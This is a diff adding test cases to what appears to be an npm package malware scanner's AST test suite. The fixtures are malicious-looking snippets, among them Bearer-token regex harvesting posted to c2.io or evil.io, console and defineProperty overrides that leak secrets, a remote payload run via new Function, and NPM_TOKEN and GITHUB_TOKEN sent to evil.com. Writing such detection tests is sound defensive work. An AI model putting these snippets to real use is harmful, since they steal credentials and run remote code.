@@ -1395,6 +1395,469 @@ new Worker('./worker.js');
       assert(!t, 'new Worker("./file.js") without eval:true should NOT trigger');
     } finally { cleanupTemp(tmp); }
   });
+  // ===== WASM Host Sink Detection (AST-036) =====
+
+  asyncTest('AST: WebAssembly.compile + https.request → wasm_host_sink CRITICAL', async () => {
+    const tmp = makeTempPkg(`
+const fs = require('fs');
+const path = require('path');
+async function initWasm() {
+  const wasmBuffer = fs.readFileSync(path.join(__dirname, 'core.wasm'));
+  const wasmModule = await WebAssembly.compile(wasmBuffer);
+  const importObject = {
+    env: {
+      __host_send: (ptr, len) => {
+        const https = require('https');
+        const req = https.request({ hostname: 'c2.io', method: 'POST' });
+        req.end();
+      }
+    }
+  };
+  await WebAssembly.instantiate(wasmModule, importObject);
+}
+initWasm();
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'wasm_host_sink');
+      assert(t, 'Should detect wasm_host_sink');
+      assert(t.severity === 'CRITICAL', 'Severity should be CRITICAL');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  asyncTest('AST: WebAssembly.compile without network sinks → no wasm_host_sink', async () => {
+    const tmp = makeTempPkg(`
+const fs = require('fs');
+async function initWasm() {
+  const wasmBuffer = fs.readFileSync('math.wasm');
+  const mod = await WebAssembly.compile(wasmBuffer);
+  const instance = await WebAssembly.instantiate(mod, {
+    env: { memory: new WebAssembly.Memory({ initial: 1 }) }
+  });
+  return instance.exports.add(1, 2);
+}
+module.exports = initWasm;
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'wasm_host_sink');
+      assert(!t, 'Pure computation WASM should NOT trigger wasm_host_sink');
+    } finally { cleanupTemp(tmp); }
+  });
+  // --- Adversarial regression: EventEmitter prototype hooking ---
+  asyncTest('AST: Detects events.EventEmitter.prototype.emit override', async () => {
+    const tmp = makeTempPkg(`
+const events = require('events');
+const origEmit = events.EventEmitter.prototype.emit;
+events.EventEmitter.prototype.emit = function(type, ...args) {
+  if (type === 'data') { /* exfil */ }
+  return origEmit.apply(this, [type, ...args]);
+};
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'prototype_hook' && t.message.includes('EventEmitter'));
+      assert(t, 'Should detect EventEmitter.prototype.emit override');
+      assert(t.severity === 'CRITICAL', 'EventEmitter prototype hook should be CRITICAL');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- Adversarial regression: dgram UDP exfiltration ---
+  asyncTest('AST: Detects dgram.Socket.prototype override', async () => {
+    const tmp = makeTempPkg(`
+const dgram = require('dgram');
+const origSend = dgram.Socket.prototype.send;
+dgram.Socket.prototype.send = function(...args) {
+  return origSend.apply(this, args);
+};
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'prototype_hook');
+      assert(t, 'Should detect dgram.Socket.prototype override');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- Adversarial regression: setTimeout with string literal argument ---
+  asyncTest('AST: Detects setTimeout with string argument as eval', async () => {
+    const tmp = makeTempPkg(`
+setTimeout('require("child_process").execSync("whoami")', 100);
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'dangerous_call_eval' && t.message.includes('setTimeout'));
+      assert(t, 'Should detect setTimeout with string literal argument');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- Adversarial regression: setTimeout with function (should NOT flag) ---
+  asyncTest('AST: setTimeout with arrow function NOT flagged', async () => {
+    const tmp = makeTempPkg(`
+setTimeout(() => console.log('ok'), 100);
+setTimeout(function() { console.log('ok'); }, 100);
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'dangerous_call_eval' && t.message.includes('setTimeout'));
+      assert(!t, 'Should NOT flag setTimeout with function argument');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- Adversarial regression: Proxy with inline set trap + network ---
+  asyncTest('AST: Detects Proxy set trap + network compound', async () => {
+    const tmp = makeTempPkg(`
+const https = require('https');
+module.exports = new Proxy({}, { set(t, p, v) { https.request({hostname:'evil.io'}).end(); return true; } });
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'proxy_data_intercept');
+      assert(t, 'Should detect Proxy set trap + network compound');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- Adversarial regression: remote code loading (fetch + Function) ---
+  asyncTest('AST: Detects remote fetch + new Function compound', async () => {
+    const tmp = makeTempPkg(`
+const https = require('https');
+https.get('https://cdn.evil.io/payload.js', (res) => {
+  let data = '';
+  res.on('data', c => data += c);
+  res.on('end', () => new Function(data)());
+});
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'remote_code_load');
+      assert(t, 'Should detect remote code loading compound');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- Adversarial regression: JSON.stringify override ---
+  asyncTest('AST: Detects JSON.stringify override', async () => {
+    const tmp = makeTempPkg(`
+const orig = JSON.stringify;
+JSON.stringify = function(v) { return orig.call(JSON, v); };
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'prototype_hook' && t.message.includes('JSON.stringify'));
+      assert(t, 'Should detect JSON.stringify override');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- Adversarial regression: credential regex harvesting ---
+  asyncTest('AST: Detects credential regex + network compound', async () => {
+    const tmp = makeTempPkg(`
+const https = require('https');
+const pattern = /Bearer\\s+[A-Za-z0-9]+/g;
+function scan(data) {
+  const m = data.match(pattern);
+  if (m) {
+    const req = https.request({hostname: 'evil.io', method: 'POST'});
+    req.write(JSON.stringify(m));
+    req.end();
+  }
+}
+module.exports = scan;
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'credential_regex_harvest');
+      assert(t, 'Should detect credential regex harvesting');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // builtin_override_exfil: console method override + network
+  await asyncTest('AST: detects console method override + network as builtin_override_exfil', async () => {
+    const tmp = makeTempPkg(`
+const https = require('https');
+const orig = console.log;
+console.log = function(...args) {
+  const data = args.join(' ');
+  if (/secret/i.test(data)) {
+    https.request({ hostname: 'evil.io', path: '/log', method: 'POST' }).end(data);
+  }
+  return orig.apply(console, args);
+};
+module.exports = {};
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'builtin_override_exfil');
+      assert(t, 'Should detect builtin method override + network');
+      assert(t.severity === 'HIGH', 'Should be HIGH severity');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // builtin_override_exfil: Object.defineProperty override + network
+  await asyncTest('AST: detects Object.defineProperty override + network as builtin_override_exfil', async () => {
+    const tmp = makeTempPkg(`
+const https = require('https');
+const origDP = Object.defineProperty;
+Object.defineProperty = function(obj, prop, desc) {
+  if (/token|secret/i.test(prop)) {
+    https.request({ hostname: 'c2.io', path: '/prop', method: 'POST' }).end(prop);
+  }
+  return origDP.call(Object, obj, prop, desc);
+};
+module.exports = {};
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'builtin_override_exfil');
+      assert(t, 'Should detect Object.defineProperty override + network');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // stream_credential_intercept: Transform stream + credential regex + network
+  await asyncTest('AST: detects Transform stream credential interception', async () => {
+    const tmp = makeTempPkg(`
+const { Transform } = require('stream');
+const https = require('https');
+class Sniffer extends Transform {
+  _transform(chunk, enc, cb) {
+    const str = chunk.toString();
+    const m = str.match(/Bearer\\s+[A-Za-z0-9]+/g);
+    if (m) {
+      https.request({ hostname: 'c2.io', path: '/sniff', method: 'POST' }).end(JSON.stringify(m));
+    }
+    this.push(chunk);
+    cb();
+  }
+}
+module.exports = { Sniffer };
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'stream_credential_intercept');
+      assert(t, 'Should detect Transform stream credential interception');
+      assert(t.severity === 'HIGH', 'Should be HIGH severity');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // Negative test: clean Transform stream (no credential regex, no network)
+  await asyncTest('AST: does not flag clean Transform stream', async () => {
+    const tmp = makeTempPkg(`
+const { Transform } = require('stream');
+class Upper extends Transform {
+  _transform(chunk, enc, cb) {
+    this.push(chunk.toString().toUpperCase());
+    cb();
+  }
+}
+module.exports = { Upper };
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'stream_credential_intercept');
+      assert(!t, 'Should NOT detect clean Transform stream');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // ==========================================================================
+  // FP Reduction P5 Tests
+  // ==========================================================================
+
+  // Fix 1: setTimeout — only flag string Literal, not Identifier/MemberExpression
+  await asyncTest('FP-P5 Fix1: setTimeout with string literal IS flagged', async () => {
+    const tmp = makeTempPkg(`setTimeout("require('child_process').exec('whoami')", 100);`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'dangerous_call_eval' && t.message.includes('setTimeout'));
+      assert(t, 'setTimeout with string literal should be flagged');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('FP-P5 Fix1: setTimeout with Identifier NOT flagged', async () => {
+    const tmp = makeTempPkg(`function myFunc() { console.log('ok'); }\nsetTimeout(myFunc, 100);`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'dangerous_call_eval' && t.message.includes('setTimeout'));
+      assert(!t, 'setTimeout with Identifier should NOT be flagged');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('FP-P5 Fix1: setInterval with MemberExpression NOT flagged', async () => {
+    const tmp = makeTempPkg(`const obj = { tick() {} };\nsetInterval(obj.tick, 1000);`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'dangerous_call_eval' && t.message.includes('setInterval'));
+      assert(!t, 'setInterval with MemberExpression should NOT be flagged');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // Fix 2: eval('this') should NOT set hasDynamicExec → no remote_code_load compound
+  await asyncTest('FP-P5 Fix2: eval("this") + fetch does NOT trigger remote_code_load', async () => {
+    const tmp = makeTempPkg(`
+var g = eval('this');
+fetch('https://registry.npmjs.org/lodash').then(r => r.json());
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const rcl = result.threats.find(t => t.type === 'remote_code_load');
+      assert(!rcl, 'eval("this") + fetch should NOT trigger remote_code_load');
+      // eval('this') itself should still be flagged as LOW
+      const evalT = result.threats.find(t => t.type === 'dangerous_call_eval');
+      assert(evalT, 'eval("this") should still be flagged');
+      assert(evalT.severity === 'LOW', `eval("this") should be LOW, got ${evalT.severity}`);
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('FP-P5 Fix2: eval(dynamicVar) + fetch DOES trigger remote_code_load', async () => {
+    const tmp = makeTempPkg(`
+const code = getCode();
+eval(code);
+fetch('https://evil.com/payload').then(r => r.text());
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const rcl = result.threats.find(t => t.type === 'remote_code_load');
+      assert(rcl, 'eval(dynamic) + fetch should trigger remote_code_load');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // Fix 3: isEnvSensitive — word-boundary matching with non-sensitive qualifiers
+  await asyncTest('FP-P5 Fix3: PUBLIC_KEY NOT flagged (PUBLIC qualifier)', async () => {
+    const tmp = makeTempPkg(`const k = process.env.PUBLIC_KEY; console.log(k);`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'env_access' && t.message.includes('PUBLIC_KEY'));
+      assert(!t, 'PUBLIC_KEY should NOT be flagged (PUBLIC qualifier)');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('FP-P5 Fix3: CACHE_KEY NOT flagged (CACHE qualifier)', async () => {
+    const tmp = makeTempPkg(`const k = process.env.CACHE_KEY; console.log(k);`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'env_access' && t.message.includes('CACHE_KEY'));
+      assert(!t, 'CACHE_KEY should NOT be flagged (CACHE qualifier)');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('FP-P5 Fix3: NPM_TOKEN still flagged', async () => {
+    const tmp = makeTempPkg(`const t = process.env.NPM_TOKEN; fetch('http://evil.com', {body: t});`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'env_access' && t.message.includes('NPM_TOKEN'));
+      assert(t, 'NPM_TOKEN should still be flagged');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('FP-P5 Fix3: GITHUB_TOKEN still flagged', async () => {
+    const tmp = makeTempPkg(`const t = process.env.GITHUB_TOKEN; fetch('http://evil.com', {body: t});`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'env_access' && t.message.includes('GITHUB_TOKEN'));
+      assert(t, 'GITHUB_TOKEN should still be flagged');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('FP-P5 Fix3: GITHUB_REPOSITORY NOT flagged (safe CI var)', async () => {
+    const tmp = makeTempPkg(`const r = process.env.GITHUB_REPOSITORY; console.log(r);`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'env_access' && t.message.includes('GITHUB_REPOSITORY'));
+      assert(!t, 'GITHUB_REPOSITORY should NOT be flagged (safe CI var)');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('FP-P5 Fix3: NEXT_PUBLIC_ prefix NOT flagged', async () => {
+    const tmp = makeTempPkg(`const u = process.env.NEXT_PUBLIC_API_URL; console.log(u);`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'env_access' && t.message.includes('NEXT_PUBLIC_'));
+      assert(!t, 'NEXT_PUBLIC_ prefix should NOT be flagged');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // Fix 4: credential_regex_harvest — keyword must be INSIDE the regex
+  await asyncTest('FP-P5 Fix4: credential keyword inside regex IS flagged', async () => {
+    const tmp = makeTempPkg(`
+const https = require('https');
+const data = input.match(/Bearer\\s+[A-Za-z0-9]+/g);
+if (data) https.request({ hostname: 'c2.io' }).end(JSON.stringify(data));
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'credential_regex_harvest');
+      assert(t, 'Regex with credential keyword inside should be flagged');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('FP-P5 Fix4: credential keyword outside regex NOT flagged', async () => {
+    const tmp = makeTempPkg(`
+const https = require('https');
+const header = 'X-XSRF-TOKEN';
+const valid = /^https:\\/\\//i.test(url);
+https.request({ hostname: 'api.example.com', headers: { [header]: token } }).end();
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'credential_regex_harvest');
+      assert(!t, 'Credential keyword outside regex should NOT trigger credential_regex_harvest');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // Fix 6: proxy_data_intercept — Identifier handler removed, severity nuance
+  await asyncTest('FP-P5 Fix6: Proxy with Identifier handler NOT flagged', async () => {
+    const tmp = makeTempPkg(`
+const handler = require('./handler');
+const proxy = new Proxy(target, handler);
+fetch('https://api.example.com/data');
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'proxy_data_intercept');
+      assert(!t, 'Proxy with Identifier handler should NOT be flagged');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('FP-P5 Fix6: Proxy with inline trap IS flagged', async () => {
+    const tmp = makeTempPkg(`
+const proxy = new Proxy(target, {
+  set(target, prop, value) { exfil(value); return true; }
+});
+fetch('https://c2.evil.com/data');
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'proxy_data_intercept');
+      assert(t, 'Proxy with inline set trap + network should be flagged');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('FP-P5 Fix6: Proxy severity CRITICAL when credential signal present', async () => {
+    const tmp = makeTempPkg(`
+const t = process.env.API_SECRET;
+const proxy = new Proxy(target, {
+  get(target, prop) { return target[prop]; }
+});
+fetch('https://c2.evil.com/data');
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const pt = result.threats.find(t => t.type === 'proxy_data_intercept');
+      assert(pt, 'Proxy with inline get trap + network should be flagged');
+      assert(pt.severity === 'CRITICAL', `Should be CRITICAL when env_access present, got ${pt.severity}`);
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('FP-P5 Fix6: Proxy severity HIGH without credential signal', async () => {
+    const tmp = makeTempPkg(`
+const proxy = new Proxy(target, {
+  get(target, prop) { return target[prop]; }
+});
+fetch('https://c2.evil.com/data');
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const pt = result.threats.find(t => t.type === 'proxy_data_intercept');
+      assert(pt, 'Proxy with inline get trap + network should be flagged');
+      assert(pt.severity === 'HIGH', `Should be HIGH without credential signal, got ${pt.severity}`);
+    } finally { cleanupTemp(tmp); }
+  });
 }
 
 module.exports = { runAstTests };
